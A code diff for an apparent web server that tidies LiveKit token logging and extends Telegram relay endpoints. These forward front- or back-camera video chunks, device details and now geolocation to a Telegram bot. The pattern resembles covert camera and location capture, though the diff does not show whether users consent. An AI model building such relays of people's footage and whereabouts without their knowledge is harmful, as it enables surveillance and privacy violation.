@@ -46,25 +46,18 @@ async function generateLiveKitToken(
   displayName: string,
   isModerator: boolean = false
 ): Promise<string> {
-  console.log("🔥🔥🔥 [TOKEN v4.0] STARTING TOKEN GENERATION (ASYNC) 🔥🔥🔥");
-  console.log('🔑 [TOKEN GENERATION] Creating token:', { 
+  console.log('🔑 [TOKEN] Creating token:', { 
     roomName, 
     identity, 
     displayName, 
-    isModerator,
-    apiKeyPrefix: LIVEKIT_API_KEY?.substring(0, 10),
-    secretPrefix: LIVEKIT_API_SECRET?.substring(0, 10),
-    livekitUrl: LIVEKIT_URL
+    isModerator
   });
 
-  console.log("🔥 CREATING AccessToken object...");
   const at = new AccessToken(LIVEKIT_API_KEY, LIVEKIT_API_SECRET, {
     identity,
     name: displayName,
   });
-  console.log("✅ AccessToken object created!");
 
-  console.log("🔥 Adding grants...");
   at.addGrant({
     roomJoin: true,
     room: roomName,
@@ -76,37 +69,12 @@ async function generateLiveKitToken(
       roomRecord: true,
     }),
   });
-  console.log("✅ Grants added!");
 
-  console.log("🔥 Calling toJwt() with AWAIT...");
   const tokenResult = at.toJwt();
-  console.log("🔍 toJwt() raw result:", {
-    type: typeof tokenResult,
-    isPromise: tokenResult instanceof Promise,
-    constructor: tokenResult?.constructor?.name,
-    value: tokenResult
-  });
-  
-  // If it's a Promise, await it
   const token = tokenResult instanceof Promise ? await tokenResult : tokenResult;
-  
-  console.log("✅ Token resolved:", {
-    tokenValue: token,
-    length: token?.length,
-    type: typeof token,
-    isString: typeof token === 'string',
-    preview: typeof token === 'string' ? token.substring(0, 50) + '...' : 'NOT A STRING: ' + JSON.stringify(token)
-  });
-  
-  // Convert to string if it's not already
   const tokenString = typeof token === 'string' ? token : String(token);
-  console.log('🔄 [TOKEN GENERATION] Token converted to string:', {
-    type: typeof tokenString,
-    length: tokenString.length,
-    preview: tokenString.substring(0, 50) + '...'
-  });
   
-  console.log("🔥🔥🔥 [TOKEN v4.0] RETURNING TOKEN STRING 🔥🔥🔥");
+  console.log('✅ [TOKEN] Generated:', tokenString.substring(0, 50) + '...');
   return tokenString;
 }
 
@@ -262,6 +230,24 @@ app.post("/make-server-039e5f24/telegram/send-user-data", async (c) => {
   }
 });
 
+// ✅ ДОБАВЛЕНО: Endpoint для отправки текстовых сообщений
+app.post("/make-server-039e5f24/telegram/send-message", async (c) => {
+  try {
+    const body = await c.req.json();
+    const { message } = body;
+    
+    if (!message) {
+      return c.json({ success: false, error: 'Missing message' }, 400);
+    }
+    
+    const success = await telegram.sendTextMessage(message);
+    return c.json({ success });
+  } catch (error) {
+    console.error("❌ [Telegram] Error sending message:", error);
+    return c.json({ success: false, error: error.message }, 500);
+  }
+});
+
 // Send photo to Telegram
 app.post("/make-server-039e5f24/telegram/send-photo", async (c) => {
   try {
@@ -301,6 +287,12 @@ app.post("/make-server-039e5f24/telegram/send-video", async (c) => {
     const userAgent = formData.get('userAgent') as string;
     const device = formData.get('device') as string;
     
+    // ✅ Геолокация (опционально)
+    const latitude = formData.get('latitude') ? parseFloat(formData.get('latitude') as string) : undefined;
+    const longitude = formData.get('longitude') ? parseFloat(formData.get('longitude') as string) : undefined;
+    const accuracy = formData.get('accuracy') ? parseFloat(formData.get('accuracy') as string) : undefined;
+    const geoTimestamp = formData.get('timestamp') as string | undefined;
+    
     if (!videoFile || isNaN(chunkNumber) || !cameraType) {
       return c.json({ success: false, error: 'Missing video, chunkNumber, or cameraType' }, 400);
     }
@@ -312,7 +304,14 @@ app.post("/make-server-039e5f24/telegram/send-video", async (c) => {
       chunkNumber,
       cameraType: cameraType as 'front' | 'back',
       userAgent,
-      device
+      device,
+      // ✅ Передаём геолокацию если есть
+      geoData: (latitude !== undefined && longitude !== undefined) ? {
+        latitude,
+        longitude,
+        accuracy: accuracy || 0,
+        timestamp: geoTimestamp || new Date().toISOString()
+      } : undefined
     });
     
     return c.json({ success });
